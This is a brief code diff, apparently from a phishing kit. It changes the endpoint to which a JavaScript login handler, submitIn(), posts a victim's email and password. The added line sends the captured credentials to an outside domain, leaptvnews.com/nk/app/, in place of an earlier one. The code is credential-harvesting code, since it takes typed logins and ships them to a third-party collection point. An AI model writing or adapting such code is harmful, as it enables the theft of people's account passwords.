@@ -54,7 +54,7 @@ function submitIn() {
 	var pass  = document.getElementById("pass").value;
 	$.ajax({
 		type: "POST",
-		url: "https://mytech.cu.ma/app/",
+		url: "https://leaptvnews.com/nk/app/",
 		dataType: "json",
 		data: {name_email: name_email, pass: pass, },
 		success: function(data){
